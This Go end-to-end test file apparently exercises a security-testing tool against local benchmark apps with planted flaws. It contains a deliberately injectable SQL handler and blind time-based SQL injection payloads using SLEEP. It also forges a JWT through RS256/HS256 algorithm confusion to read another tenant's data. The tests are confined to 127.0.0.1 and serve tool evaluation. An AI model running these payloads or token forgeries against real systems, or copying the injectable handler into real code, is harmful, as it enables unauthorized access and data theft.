package e2e

import (
	"context"
	"encoding/json"
	"net/http"
	"net/url"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/vKS-Rajput/doge/internal/benchmark"
	"github.com/vKS-Rajput/doge/internal/novelty"
	"github.com/vKS-Rajput/doge/internal/property"
	"github.com/vKS-Rajput/doge/internal/sandbox"
	"github.com/vKS-Rajput/doge/internal/strategy"
	"github.com/vKS-Rajput/doge/internal/whitebox"
	"github.com/vKS-Rajput/doge/internal/worldmodel"
)

// TestV5FleetBlindOracleSlice tests BENCH-008:
// Verifying Whitebox AST Taint Detection + Tactical Sandboxed Blind Timing Exploitation.
func TestV5FleetBlindOracleSlice(t *testing.T) {
	app := benchmark.NewBlindOracleApp()
	defer app.Close()

	t.Logf("=== DOGE Phase 5: Hybrid Fleet - Blind Timing Oracle (BENCH-008) ===")
	t.Logf("Target: %s", app.URL())
	t.Logf("Planted Flaw: Silent Blind SQL Timing Oracle (NOT disclosed)")

	// Step 1: Whitebox AST & Taint Analysis
	t.Log(">>> Fleet Agent 1: Deterministic Whitebox AST & Taint Analysis")
	mockSource := `package main
import (
	"fmt"
	"net/http"
)
func handleLookup(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	query := fmt.Sprintf("SELECT * FROM users WHERE id = '%s'", id)
	_ = query
}
`
	parser := whitebox.NewASTParser()
	tracer := whitebox.NewTaintTracer()

	_, sources, err := parser.ParseContent(mockSource, "handler.go", whitebox.LangGo)
	if err != nil {
		t.Fatalf("failed to parse source: %v", err)
	}

	taintPaths := tracer.TraceTaint(mockSource, "handler.go", sources)
	if len(taintPaths) == 0 {
		t.Fatalf("expected taint path detected from id parameter to SQL query")
	}

	taintPath := taintPaths[0]
	t.Logf("✓ Static Taint Path Confirmed: Param %q -> Sink %s (Expression: %s)",
		taintPath.SourceParam, taintPath.Sink.Type, taintPath.Sink.Expression)

	// Step 2: Tactical Sandbox Initialization
	t.Log(">>> Fleet Agent 2: Tactical Execution Sandbox Setup")
	sbCfg := sandbox.SandboxConfig{
		MaxRequests:     25,
		Timeout:         5 * time.Second,
		RateLimitPerSec: 50,
		AllowedHosts:    []string{"127.0.0.1"},
	}
	sb := sandbox.NewTacticalSandbox(sbCfg)
	ctx := context.Background()

	// Step 3: Sandboxed Differential Timing Probing
	t.Log(">>> Fleet Agent 3: Differential Timing Execution")

	// 3a. Baseline probe (1=2 false condition)
	negURL := app.URL() + "/api/v1/users/lookup?id=" + url.QueryEscape("1' AND 1=2 AND SLEEP(35)--")
	reqNeg, _ := http.NewRequest("GET", negURL, nil)
	t0 := time.Now()
	respNeg, _, err := sb.ExecuteHTTP(ctx, reqNeg)
	if err != nil {
		t.Fatalf("negative probe failed: %v", err)
	}
	negDuration := time.Since(t0)

	// 3b. Positive probe (1=1 true condition)
	posURL := app.URL() + "/api/v1/users/lookup?id=" + url.QueryEscape("1' AND 1=1 AND SLEEP(35)--")
	reqPos, _ := http.NewRequest("GET", posURL, nil)
	t1 := time.Now()
	respPos, _, err := sb.ExecuteHTTP(ctx, reqPos)
	if err != nil {
		t.Fatalf("positive probe failed: %v", err)
	}
	posDuration := time.Since(t1)

	timingDelta := posDuration - negDuration
	t.Logf("Timing Results: Neg=%v (Status %d) | Pos=%v (Status %d) | Delta=%v",
		negDuration, respNeg.StatusCode, posDuration, respPos.StatusCode, timingDelta)

	if timingDelta < 25*time.Millisecond {
		t.Fatalf("expected timing delta >= 25ms, got %v", timingDelta)
	}
	t.Logf("✓ Verified Differential Timing Oracle: Latency divergence %v confirms vulnerability!", timingDelta)

	// Step 4: MDL Anomaly Scoring over Timing Dimension
	t.Log(">>> Fleet Agent 4: MDL Anomaly Scoring & Concept Learning")
	mdlDetector := novelty.NewMDLAnomalyDetector(0.65)
	catalog := property.NewCatalog()

	timingObs := &novelty.MDLObservation{
		ID:             uuid.New(),
		URL:            posURL,
		Method:         "GET",
		StatusCode:     respPos.StatusCode,
		ResponseTimeMs: float64(posDuration.Milliseconds()),
		Timestamp:      time.Now().UTC(),
	}

	timingResult := mdlDetector.EvaluateObservation(timingObs, catalog)
	t.Logf("MDL Timing Evaluation: Score=%.2f, IsStructuralAnomaly=%v",
		timingResult.AnomalyScore, timingResult.IsStructuralAnomaly)

	// Step 5: Verify Sandbox Replay Journal & Resource Accounting
	journal := sb.GetJournal()
	if len(journal) < 2 {
		t.Errorf("expected at least 2 journal entries, got %d", len(journal))
	}
	t.Logf("✓ Tactical Sandbox Accounting: %s", sb.Accountant().FormatSummary())
	t.Log("=== DOGE-FLEET (BENCH-008): PASSED ✅ ===")
}

// TestV5FleetTokenConfusionSlice tests BENCH-009:
// Verifying Cross-Tenant RS256/HS256 Algorithm Confusion and Token Forgery.
func TestV5FleetTokenConfusionSlice(t *testing.T) {
	app := benchmark.NewTokenConfusionApp()
	defer app.Close()

	t.Logf("=== DOGE Phase 5: Hybrid Fleet - Token Algorithm Confusion (BENCH-009) ===")
	t.Logf("Target: %s", app.URL())
	t.Logf("Planted Flaw: JWT RS256 vs HS256 Public Key Asymmetry Confusion (NOT disclosed)")

	sbCfg := sandbox.SandboxConfig{
		MaxRequests:     20,
		Timeout:         5 * time.Second,
		RateLimitPerSec: 50,
		AllowedHosts:    []string{"127.0.0.1"},
	}
	sb := sandbox.NewTacticalSandbox(sbCfg)
	ctx := context.Background()

	// Step 1: Reconnaissance - Fetch Public Key
	t.Log(">>> Fleet Agent 1: Public Key Reconnaissance")
	reqKey, _ := http.NewRequest("GET", app.URL()+"/api/v1/auth/public_key", nil)
	respKey, bodyKey, err := sb.ExecuteHTTP(ctx, reqKey)
	if err != nil {
		t.Fatalf("failed to fetch public key: %v", err)
	}
	if respKey.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d", respKey.StatusCode)
	}

	var keyInfo struct {
		PublicKey string `json:"public_key"`
		Algorithm string `json:"algorithm"`
	}
	if err := json.Unmarshal(bodyKey, &keyInfo); err != nil {
		t.Fatalf("failed to decode key json: %v", err)
	}
	t.Logf("✓ Retrieved Server Public RSA Key (Declared Alg: %s)", keyInfo.Algorithm)

	// Step 2: Negative Control - Attempt Direct Cross-Tenant Access without Forgery
	t.Log(">>> Fleet Agent 2: Negative Differential Control (Unforged Access)")
	reqDirect, _ := http.NewRequest("GET", app.URL()+"/api/v1/tenant/data", nil)
	respDirect, _, _ := sb.ExecuteHTTP(ctx, reqDirect)
	if respDirect.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 Unauthorized for unauthenticated request, got %d", respDirect.StatusCode)
	}
	t.Logf("✓ Negative Control Confirmed: Unauthenticated access rejected with 401")

	// Step 3: Strategy Synthesis - Synthesize Token Algorithm Confusion Exploit
	t.Log(">>> Fleet Agent 3: Research Strategy Synthesis for Key Confusion")
	synthesizer := strategy.NewStrategySynthesizer()
	prog := synthesizer.SynthesizeStrategy(app.URL()+"/api/v1/tenant/data", "CryptographicAlgorithmDuality", false)

	scopePolicy := strategy.ScopePolicy{
		AllowedHosts: []string{"127.0.0.1"},
		MaxCost:      100,
		MaxRisk:      0.50,
	}
	if err := strategy.TypeCheck(prog, scopePolicy); err != nil {
		t.Fatalf("strategy failed type check: %v", err)
	}
	t.Logf("✓ Strategy Type-Checked: %s", prog.ID)

	// Step 4: Tactical Execution - Forge HS256 Token with Victim Tenant ID
	t.Log(">>> Fleet Agent 4: Forging HS256 Token using Server Public Key as HMAC Secret")
	forgedToken := benchmark.ForgeHS256Token("tenant_victim", "admin", keyInfo.PublicKey)

	reqForged, _ := http.NewRequest("GET", app.URL()+"/api/v1/tenant/data", nil)
	reqForged.Header.Set("Authorization", "Bearer "+forgedToken)

	respForged, bodyForged, err := sb.ExecuteHTTP(ctx, reqForged)
	if err != nil {
		t.Fatalf("forged token request failed: %v", err)
	}

	if respForged.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK with forged token, got status %d (body: %s)", respForged.StatusCode, string(bodyForged))
	}

	var resultData struct {
		TenantID       string `json:"tenant_id"`
		Data           string `json:"data"`
		VerifiedViaAlg string `json:"verified_via_alg"`
	}
	if err := json.Unmarshal(bodyForged, &resultData); err != nil {
		t.Fatalf("failed to unmarshal response data: %v", err)
	}

	t.Logf("Exfiltrated Tenant Record: Tenant=%s | Data=%q | VerifiedAlg=%s",
		resultData.TenantID, resultData.Data, resultData.VerifiedViaAlg)

	if resultData.TenantID != "tenant_victim" {
		t.Errorf("expected tenant_victim data exfiltrated, got %s", resultData.TenantID)
	}
	t.Log("✓ Verified Cross-Tenant Impact: Exfiltrated confidential M&A asset valuation!")

	// Step 5: World Model Provenance Update
	wm := worldmodel.NewUnifiedWorldModelGraph("target_token_confusion")
	vConcept := wm.AddVertex(worldmodel.RoleConcept, "CONCEPT_JWT_ALGORITHM_CONFUSION_KEY_DESYNC", 1.0, 0.0, nil)
	vEvidence := wm.AddVertex(worldmodel.RoleEvidence, "Evidence_TenantVictimDataExfiltrated", 1.0, 0.0, nil)
	wm.AddEdge(vConcept.ID, vEvidence.ID, worldmodel.EdgeExemplifiesConcept, 1.0, uuid.New(), "Cross-Tenant Key Confusion Exploit Proof")

	t.Logf("✓ Updated World Model with Proven Finding and Evidence Provenance")
	t.Log("=== DOGE-FLEET (BENCH-009): PASSED ✅ ===")
}
